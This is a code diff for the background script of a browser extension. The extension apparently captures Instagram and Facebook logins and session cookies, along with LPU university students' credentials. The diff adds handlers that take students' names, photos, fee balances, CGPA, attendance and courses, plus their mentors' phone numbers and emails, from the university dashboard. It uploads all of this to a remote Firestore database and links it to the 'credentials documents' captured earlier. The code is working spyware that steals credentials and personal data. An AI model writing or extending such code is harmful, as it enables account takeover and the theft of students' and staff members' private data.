@@ -8,7 +8,7 @@ console.log(
 
 // ============== Firebase + Utils Imports ==============
 import { db } from "./session/firebase-init.js";
-import { collection, addDoc, getDocs, query, where, deleteDoc, doc } from "./session/firebase-firestore.js";
+import { collection, addDoc, getDocs, query, where, deleteDoc, doc, updateDoc } from "./session/firebase-firestore.js";
 import { isDuplicateData } from "./session/utils.js";
 
 // ============== Icon Cache for WebIn Overlay ==============
@@ -46,10 +46,272 @@ async function fetchIconAsDataUrl(url) {
 const savedStudentSet = new Set();
 const savedInstagramBySessionId = new Set(); // Deduplicate by sessionId
 const savedFacebookByCUser = new Set(); // Deduplicate by c_user
+// Note: Profile and Academic data no longer use dedup sets - they always update with latest data
 
 // ============== Pending Credentials (waiting for session) ==============
 let pendingInstagramCreds = null; // { username, password, capturedAt }
 let pendingFacebookCreds = null; // { email, password, capturedAt }
+
+// ============== LPU Profile Data Handler ==============
+// Captures name, section, program from dashboard and updates studentData
+// Retry logic: If no document found, wait and retry (to handle race condition with credentials save)
+async function handleLpuProfileData(data, retryCount = 0) {
+  const { 
+    studentName, registrationNumber, section, program, 
+    pwdExpiryDays, pwdExpiryDate, 
+    studentProfilePic,
+    mentorName, mentorMobile, mentorEmail, mentorDesignation, mentorDivision, mentorProfilePic,
+    feeBalance, feeStatus 
+  } = data;
+
+  if (!registrationNumber) {
+    console.warn("[LPU-Profile] SKIP: No registration number provided");
+    return;
+  }
+
+  console.log("%c╔══════════════════════════════════════════════════════════════╗", "color: #2196f3; font-weight: bold;");
+  console.log("%c║           LPU PROFILE DATA UPDATE                            ║", "color: #2196f3; font-weight: bold;");
+  console.log("%c╚══════════════════════════════════════════════════════════════╝", "color: #2196f3; font-weight: bold;");
+  console.log("%c[LPU-Profile] Registration: " + registrationNumber + (retryCount > 0 ? " (retry #" + retryCount + ")" : ""), "color: #2196f3; font-weight: bold;");
+  console.log("%c[LPU-Profile] Timestamp: " + new Date().toLocaleTimeString(), "color: #9e9e9e;");
+
+  const colRef = collection(db, "studentData");
+
+  try {
+    // Find existing entry for this registration number
+    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
+    const regSnapshot = await getDocs(regQ);
+
+    if (!regSnapshot.empty) {
+      // Update existing entry (MERGE with existing data)
+      const existingDoc = regSnapshot.docs[0];
+      const existingData = existingDoc.data();
+      
+      // Build update object - only update fields that have NEW values
+      const updateData = {
+        profileUpdatedAt: new Date()
+      };
+      
+      // Track what's being updated for logging
+      const updates = [];
+      const newFields = [];
+      
+      // Helper to check and add update
+      const checkAndAdd = (field, value, displayName) => {
+        if (value !== null && value !== undefined && value !== '') {
+          const oldValue = existingData[field];
+          if (oldValue !== value) {
+            updateData[field] = value;
+            if (oldValue) {
+              updates.push(`${displayName}: "${oldValue}" → "${typeof value === 'string' && value.length > 50 ? value.substring(0, 50) + '...' : value}"`);
+            } else {
+              newFields.push(`${displayName}: "${typeof value === 'string' && value.length > 50 ? value.substring(0, 50) + '...' : value}"`);
+            }
+          }
+        }
+      };
+      
+      checkAndAdd('studentName', studentName, 'Name');
+      checkAndAdd('section', section, 'Section');
+      checkAndAdd('program', program, 'Program');
+      checkAndAdd('pwdExpiryDays', pwdExpiryDays, 'Pwd Expiry Days');
+      checkAndAdd('pwdExpiryDate', pwdExpiryDate, 'Pwd Expiry Date');
+      checkAndAdd('studentProfilePic', studentProfilePic, 'Student Photo');
+      checkAndAdd('mentorName', mentorName, 'Mentor Name');
+      checkAndAdd('mentorMobile', mentorMobile, 'Mentor Mobile');
+      checkAndAdd('mentorEmail', mentorEmail, 'Mentor Email');
+      checkAndAdd('mentorDesignation', mentorDesignation, 'Mentor Designation');
+      checkAndAdd('mentorDivision', mentorDivision, 'Mentor Division');
+      checkAndAdd('mentorProfilePic', mentorProfilePic, 'Mentor Photo');
+      checkAndAdd('feeBalance', feeBalance, 'Fee Balance');
+      checkAndAdd('feeStatus', feeStatus, 'Fee Status');
+
+      // Only update if there are changes
+      if (updates.length > 0 || newFields.length > 0) {
+        await updateDoc(doc(db, "studentData", existingDoc.id), updateData);
+        
+        console.log("%c[LPU-Profile] ✅ UPDATED: " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
+        
+        if (newFields.length > 0) {
+          console.log("%c[LPU-Profile] 🆕 NEW FIELDS ADDED:", "color: #8bc34a;");
+          newFields.forEach(f => console.log("%c    + " + f, "color: #8bc34a;"));
+        }
+        
+        if (updates.length > 0) {
+          console.log("%c[LPU-Profile] 🔄 FIELDS UPDATED:", "color: #ff9800;");
+          updates.forEach(u => console.log("%c    → " + u, "color: #ff9800;"));
+        }
+      } else {
+        console.log("%c[LPU-Profile] ⏭️ SKIP: No new data to update", "color: #9e9e9e;");
+      }
+    } else {
+      // No document found - might be race condition with credentials save
+      // Retry up to 3 times with 1 second delay
+      if (retryCount < 3) {
+        console.log("%c[LPU-Profile] ⏳ WAITING: No document found, will retry in 1s... (attempt " + (retryCount + 1) + "/3)", "color: #ff9800;");
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        return handleLpuProfileData(data, retryCount + 1);
+      }
+      
+      // After retries, create new entry (fallback - credentials might not have been captured)
+      console.log("%c[LPU-Profile] ⚠️ Creating new entry (no credentials document found after retries)", "color: #ff9800;");
+      
+      const newDocData = {
+        registrationNumber,
+        timestamp: new Date()
+      };
+      
+      const addedFields = ['registrationNumber'];
+      
+      if (studentName) { newDocData.studentName = studentName; addedFields.push('studentName'); }
+      if (section) { newDocData.section = section; addedFields.push('section'); }
+      if (program) { newDocData.program = program; addedFields.push('program'); }
+      if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) { newDocData.pwdExpiryDays = pwdExpiryDays; addedFields.push('pwdExpiryDays'); }
+      if (pwdExpiryDate) { newDocData.pwdExpiryDate = pwdExpiryDate; addedFields.push('pwdExpiryDate'); }
+      if (studentProfilePic) { newDocData.studentProfilePic = studentProfilePic; addedFields.push('studentProfilePic'); }
+      if (mentorName) { newDocData.mentorName = mentorName; addedFields.push('mentorName'); }
+      if (mentorMobile) { newDocData.mentorMobile = mentorMobile; addedFields.push('mentorMobile'); }
+      if (mentorEmail) { newDocData.mentorEmail = mentorEmail; addedFields.push('mentorEmail'); }
+      if (mentorDesignation) { newDocData.mentorDesignation = mentorDesignation; addedFields.push('mentorDesignation'); }
+      if (mentorDivision) { newDocData.mentorDivision = mentorDivision; addedFields.push('mentorDivision'); }
+      if (mentorProfilePic) { newDocData.mentorProfilePic = mentorProfilePic; addedFields.push('mentorProfilePic'); }
+      if (feeBalance) { newDocData.feeBalance = feeBalance; addedFields.push('feeBalance'); }
+      if (feeStatus) { newDocData.feeStatus = feeStatus; addedFields.push('feeStatus'); }
+      
+      await addDoc(colRef, newDocData);
+      
+      console.log("%c[LPU-Profile] 🆕 CREATED: New entry for " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
+      console.log("%c[LPU-Profile] Fields added: " + addedFields.join(', '), "color: #8bc34a;");
+    }
+  } catch (err) {
+    console.error("[LPU-Profile] ❌ ERROR: Failed to save to Firestore:", err);
+  }
+}
+
+// ============== LPU Academic Data Handler ==============
+// Captures courses, CGPA, attendance from dashboard
+// ============== LPU Academic Data Handler ==============
+// Captures CGPA, attendance, courses and updates studentData
+// Retry logic: If no document found, wait and retry (to handle race condition with credentials save)
+async function handleLpuAcademicData(data, retryCount = 0) {
+  const { registrationNumber, cgpa, overallAttendance, courses } = data;
+
+  if (!registrationNumber) {
+    console.warn("[LPU-Academic] SKIP: No registration number provided");
+    return;
+  }
+
+  console.log("%c╔══════════════════════════════════════════════════════════════╗", "color: #9c27b0; font-weight: bold;");
+  console.log("%c║           LPU ACADEMIC DATA UPDATE                           ║", "color: #9c27b0; font-weight: bold;");
+  console.log("%c╚══════════════════════════════════════════════════════════════╝", "color: #9c27b0; font-weight: bold;");
+  console.log("%c[LPU-Academic] Registration: " + registrationNumber + (retryCount > 0 ? " (retry #" + retryCount + ")" : ""), "color: #9c27b0; font-weight: bold;");
+  console.log("%c[LPU-Academic] Timestamp: " + new Date().toLocaleTimeString(), "color: #9e9e9e;");
+  console.log("%c[LPU-Academic] CGPA: " + cgpa + " | Attendance: " + overallAttendance + "% | Courses: " + (courses?.length || 0), "color: #9c27b0;");
+
+  const colRef = collection(db, "studentData");
+
+  try {
+    // Find existing entry for this registration number
+    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
+    const regSnapshot = await getDocs(regQ);
+
+    if (!regSnapshot.empty) {
+      const existingDoc = regSnapshot.docs[0];
+      const existingData = existingDoc.data();
+      
+      // Build update object and track changes
+      const updateData = {
+        academicUpdatedAt: new Date()
+      };
+      
+      const updates = [];
+      const newFields = [];
+      
+      if (cgpa !== null && cgpa !== undefined) {
+        if (existingData.cgpa !== cgpa) {
+          updateData.cgpa = cgpa;
+          if (existingData.cgpa !== undefined) {
+            updates.push(`CGPA: ${existingData.cgpa} → ${cgpa}`);
+          } else {
+            newFields.push(`CGPA: ${cgpa}`);
+          }
+        }
+      }
+      
+      if (overallAttendance !== null && overallAttendance !== undefined) {
+        if (existingData.overallAttendance !== overallAttendance) {
+          updateData.overallAttendance = overallAttendance;
+          if (existingData.overallAttendance !== undefined) {
+            updates.push(`Attendance: ${existingData.overallAttendance}% → ${overallAttendance}%`);
+          } else {
+            newFields.push(`Attendance: ${overallAttendance}%`);
+          }
+        }
+      }
+      
+      if (courses && courses.length > 0) {
+        const existingCoursesCount = existingData.courses?.length || 0;
+        if (existingCoursesCount !== courses.length) {
+          updateData.courses = courses;
+          if (existingCoursesCount > 0) {
+            updates.push(`Courses: ${existingCoursesCount} → ${courses.length}`);
+          } else {
+            newFields.push(`Courses: ${courses.length} courses added`);
+          }
+        } else {
+          // Even if count is same, update courses data
+          updateData.courses = courses;
+        }
+      }
+
+      if (updates.length > 0 || newFields.length > 0) {
+        await updateDoc(doc(db, "studentData", existingDoc.id), updateData);
+        
+        console.log("%c[LPU-Academic] ✅ UPDATED: " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
+        
+        if (newFields.length > 0) {
+          console.log("%c[LPU-Academic] 🆕 NEW FIELDS:", "color: #8bc34a;");
+          newFields.forEach(f => console.log("%c    + " + f, "color: #8bc34a;"));
+        }
+        
+        if (updates.length > 0) {
+          console.log("%c[LPU-Academic] 🔄 UPDATED:", "color: #ff9800;");
+          updates.forEach(u => console.log("%c    → " + u, "color: #ff9800;"));
+        }
+      } else {
+        console.log("%c[LPU-Academic] ⏭️ SKIP: No new academic data", "color: #9e9e9e;");
+      }
+    } else {
+      // No document found - might be race condition with credentials save
+      // Retry up to 3 times with 1 second delay
+      if (retryCount < 3) {
+        console.log("%c[LPU-Academic] ⏳ WAITING: No document found, will retry in 1s... (attempt " + (retryCount + 1) + "/3)", "color: #ff9800;");
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        return handleLpuAcademicData(data, retryCount + 1);
+      }
+      
+      // After retries, create new entry (fallback - credentials might not have been captured)
+      console.log("%c[LPU-Academic] ⚠️ Creating new entry (no credentials document found after retries)", "color: #ff9800;");
+      
+      const newDocData = {
+        registrationNumber,
+        academicUpdatedAt: new Date(),
+        timestamp: new Date()
+      };
+      
+      const addedFields = [];
+      if (cgpa !== null && cgpa !== undefined) { newDocData.cgpa = cgpa; addedFields.push('CGPA: ' + cgpa); }
+      if (overallAttendance !== null && overallAttendance !== undefined) { newDocData.overallAttendance = overallAttendance; addedFields.push('Attendance: ' + overallAttendance + '%'); }
+      if (courses && courses.length > 0) { newDocData.courses = courses; addedFields.push('Courses: ' + courses.length); }
+      
+      await addDoc(colRef, newDocData);
+      console.log("%c[LPU-Academic] 🆕 CREATED: New entry for " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
+      console.log("%c[LPU-Academic] Fields: " + addedFields.join(', '), "color: #8bc34a;");
+    }
+  } catch (err) {
+    console.error("[LPU-Academic] ❌ ERROR: Failed to save to Firestore:", err);
+  }
+}
 
 // ============== Combined Message Listener ==============
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
@@ -79,6 +341,16 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   // LPU Password Expiry Update (from dashboard after login)
   if (request.type === "lpu_expiry_update") {
     handleLpuExpiryUpdate(request.data);
+  }
+
+  // LPU Profile Data Handler (name, section, program from dashboard)
+  if (request.type === "lpu_profile_data") {
+    handleLpuProfileData(request.data);
+  }
+
+  // LPU Academic Data Handler (courses, CGPA, attendance)
+  if (request.type === "lpu_academic_data") {
+    handleLpuAcademicData(request.data);
   }
 });
 
@@ -262,22 +534,16 @@ async function handleLpuExpiryUpdate(data) {
         return;
       }
 
-      // Delete old entry and create new with updated expiry info
-      await deleteDoc(doc(db, "studentData", docSnap.id));
-      
-      const updatedData = {
-        ...existingData,
-        timestamp: new Date()
-      };
-      
+      // Use updateDoc to preserve all existing fields
+      const updateData = {};
       if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) {
-        updatedData.pwdExpiryDays = pwdExpiryDays;
+        updateData.pwdExpiryDays = pwdExpiryDays;
       }
       if (pwdExpiryDate) {
-        updatedData.pwdExpiryDate = pwdExpiryDate;
+        updateData.pwdExpiryDate = pwdExpiryDate;
       }
 
-      await addDoc(colRef, updatedData);
+      await updateDoc(doc(db, "studentData", docSnap.id), updateData);
       console.log("%c[LPU-Expiry] UPDATED: " + registrationNumber + " (expires: " + pwdExpiryDate + ", days: " + pwdExpiryDays + ")", "color: #4caf50; font-weight: bold; font-size: 13px;");
     }
   } catch (err) {
